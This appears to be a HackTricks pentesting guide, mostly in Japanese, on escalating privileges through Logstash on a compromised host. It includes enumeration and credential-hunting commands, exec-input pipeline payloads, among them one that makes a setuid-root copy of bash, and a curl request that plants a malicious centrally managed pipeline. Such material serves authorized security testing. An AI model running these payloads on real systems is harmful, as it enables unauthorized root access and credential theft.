# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は **ログを収集、変換、配信**するために、**pipelines** として知られるシステムを通じて使用されます。これらのパイプラインは **input**, **filter**, **output** の各ステージで構成されます。侵害されたマシン上で Logstash が動作している場合、興味深い側面が生じます。

### Pipeline Configuration

パイプラインの設定はファイル **/etc/logstash/pipelines.yml** に記述されており、そこにはパイプライン設定の場所が一覧表示されています：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルは、パイプライン構成を含む **.conf** ファイルがどこに置かれているかを示します。**Elasticsearch output module** を使うと、**pipelines** に **Elasticsearch credentials** が含まれていることが多く、Logstash が Elasticsearch にデータを書き込む必要があるため、その資格情報は広範な権限を持つことが多いです。設定パスのワイルドカードにより、指定ディレクトリ内の一致する全ての **pipelines** を Logstash が実行できます。

もし Logstash が `pipelines.yml` の代わりに `-f <directory>` で起動されると、**そのディレクトリ内の全ファイルが辞書順に連結され、単一の config として解析されます**。これには攻撃的な意味で次の2点が生じます：

- `000-input.conf` や `zzz-output.conf` のようなファイルを置くことで、最終的な pipeline の組み立て方を変えられます
- 不正なファイルは pipeline 全体の読み込みを妨げる可能性があるため、auto-reload に頼る前に payloads を慎重に検証してください

### Fast Enumeration on a Compromised Host

Logstash がインストールされたマシンでは、まず次を確認してください：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
ローカルの monitoring API に接続可能かどうかも確認してください。デフォルトでは **127.0.0.1:9600** にバインドされており、ホストに到達した後は通常これで十分です：
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Logstash から回収した認証情報は一般的に **Elasticsearch** をアンロックすることが多いので、[this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md) を確認してください。

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **いずれか** of these criteria:

- パイプラインの **.conf** ファイルに対する **書き込みアクセス** を持っている **または**
- **/etc/logstash/pipelines.yml** ファイルがワイルドカードを使用しており、対象フォルダに書き込みできる

Additionally, **いずれか** of these conditions must be fulfilled:

- Logstash サービスを再起動できる能力がある **または**
- **/etc/logstash/logstash.yml** ファイルに **config.reload.automatic: true** が設定されている

設定にワイルドカードが含まれている場合、そのワイルドカードに一致するファイルを作成することでコマンド実行が可能になります。例えば:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、 **interval** は実行頻度（秒単位）を決定します。与えられた例では、**whoami** コマンドは 120 秒ごとに実行され、その出力は **/tmp/output.log** に向けられます。

**/etc/logstash/logstash.yml** に **config.reload.automatic: true** を設定すると、Logstash は再起動なしで新規または変更されたパイプライン設定を自動的に検出して適用します。ワイルドカードがない場合でも既存の設定を変更することは可能ですが、動作への影響を避けるため注意が必要です。

### より信頼性の高いパイプラインペイロード

`exec` input plugin は現在のリリースでも動作し、`interval` または `schedule` のいずれかを必要とします。実行は Logstash JVM を **forking** することで行われるため、メモリが不足しているとペイロードは黙って実行されるのではなく `ENOMEM` で失敗することがあります。

より実用的な privilege-escalation ペイロードは、通常、永続的なアーティファクトを残すものです:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
再起動権限がないがプロセスにシグナルを送れる場合、LogstashはUnix系システムで**SIGHUP**によるリロードもサポートします:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Logstashからのシークレットの窃取

コード実行にのみ注力する前に、Logstashが既にアクセスできるデータを収集してください:

- 平文の認証情報は、`elasticsearch {}` outputs、`http_poller`、JDBC inputs、またはクラウド関連の設定内にハードコードされていることが多い
- セキュア設定は**`/etc/logstash/logstash.keystore`**または別の`path.settings`ディレクトリに置かれている可能性がある
- keystoreのパスワードはしばしば **`LOGSTASH_KEYSTORE_PASS`** を通じて渡され、パッケージベースのインストールでは一般的に **`/etc/sysconfig/logstash`** から取得される
- `${VAR}` を使った環境変数の展開は Logstash の起動時に解決されるため、サービスの環境を確認する価値がある

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
これはチェックする価値があります。**CVE-2023-46672** により、特定の状況下で Logstash が機密情報をログに記録する可能性があることが示されました。post-exploitation ホストでは、古い Logstash ログや `journald` エントリが、現在の設定が keystore を参照していてシークレットをインラインで保存していない場合でも、資格情報を開示することがあります。

### 集中パイプライン管理の悪用

一部の環境では、ホストはローカルの `.conf` ファイルにまったく依存していません。**`xpack.management.enabled: true`** が設定されていると、Logstash は Elasticsearch/Kibana から集中管理されたパイプラインを取得でき、このモードを有効にするとローカルのパイプライン設定はもはや真のソースではなくなります。

それは別の攻撃経路を意味します:

1. ローカルの Logstash 設定、keystore、またはログから Elastic の資格情報を取得する
2. アカウントが **`manage_logstash_pipelines`** クラスタ権限を持っているか確認する
3. 中央管理されたパイプラインを作成または置換し、Logstash ホストが次回のポーリング間隔であなたのペイロードを実行するようにする

この機能で使用される Elasticsearch API は:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
これは、ローカルファイルが読み取り専用でも、Logstash が既にリモートからパイプラインを取得するよう登録されている場合に特に有用です。

## 参考

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
